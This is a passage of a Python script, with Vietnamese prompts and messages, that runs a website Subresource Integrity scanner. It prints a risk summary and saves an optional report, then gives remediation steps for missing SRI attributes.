        url = input("🔍 Nhập URL cần quét: ").strip()
    
    if not url:
        print("❌ Vui lòng nhập URL!")
        return
    
    # Khởi tạo scanner
    scanner = SRISecurityScanner(url)
    
    # Chạy scan
    success = scanner.scan_sri()
    
    if not success:
        print("❌ Quét thất bại!")
        return
    
    # Hiển thị tóm tắt
    print("\n" + "="*70)
    print("📊 TÓM TẮT KẾT QUẢ")
    print("="*70)
    print(f"Website: {scanner.url}")
    print(f"Đánh giá: {scanner.results['assessment']}")
    print(f"Mức độ rủi ro: {scanner.results['risk_level']}")
    print(f"Điểm bảo vệ: {scanner.results['protection_score']}/100")
    print(f"CVSS Score: {scanner.results['cvss_score']}")
    
    print(f"\nExternal Resources:")
    print(f"  • Total: {scanner.results.get('total_external', 0)}")
    print(f"  • Có SRI: {scanner.results.get('total_with_sri', 0)}")
    print(f"  • Thiếu SRI: {scanner.results.get('total_without_sri', 0)}")
    
    print("\n" + "-"*70)
    if scanner.results['is_vulnerable']:
        print("🔴 PHÁT HIỆN LỖ HỔNG - Cần khắc phục!")
        print("\nVấn đề:")
        for issue in scanner.results.get('issues', []):
            print(f"  ❌ {issue}")
    elif scanner.results.get('total_external', 0) == 0:
        print("✅ AN TOÀN - Không có external resources")
    else:
        print("✅ AN TOÀN - Tất cả external resources đều có SRI!")
        if scanner.results.get('protections'):
            print("\nĐiểm mạnh:")
            for prot in scanner.results.get('protections', []):
                print(f"  ✅ {prot}")
    
    print("="*70 + "\n")
    
    # Hỏi có muốn lưu báo cáo không
    save = input("💾 Bạn có muốn lưu báo cáo chi tiết? (y/n): ").strip().lower()
    
    if save in ['y', 'yes', 'có']:
        custom_name = input("📝 Nhập tên file (Enter để dùng tên mặc định): ").strip()
        filename = custom_name if custom_name else None
        
        saved_file = scanner.save_report(filename)
        
        if saved_file:
            print(f"\n✅ Hoàn tất! Xem báo cáo tại: {saved_file}")
            print(f"\n💡 Mở file bằng: ")
            print(f"   - VS Code: code {saved_file}")
            print(f"   - Notepad: notepad {saved_file}")
            print(f"   - Hoặc mở bằng Markdown viewer")
    else:
        print("\n📋 Báo cáo không được lưu.")
    
    # Hướng dẫn tiếp theo
    print("\n" + "="*70)
    print("🎯 BƯỚC TIẾP THEO")
    print("="*70)
    
    if scanner.results['is_vulnerable']:
        print("""
1. Đọc kỹ phần "Biện pháp khắc phục" trong báo cáo
2. Generate SRI hash cho từng external resource
3. Thêm integrity + crossorigin attributes
4. Test kỹ trước khi deploy production
5. Scan lại để verify đã fix thành công

🔗 Tools hữu ích:
   - https://www.srihash.org/
   - https://securityheaders.com/
        """)
    elif scanner.results.get('total_external', 0) == 0:
        print("""
1. Lưu báo cáo này để tham khảo cho audit
2. Nếu sau này thêm CDN, nhớ implement SRI
3. Tiếp tục quét các lỗi bảo mật khác
        """)
    else:
        print("""
1. Lưu báo cáo này để tham khảo cho audit
2. Duy trì SRI khi update dependencies
3. Quarterly security scan để verify SRI vẫn đúng
4. Consider thêm CSP require-sri-for directive
        """)
    
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
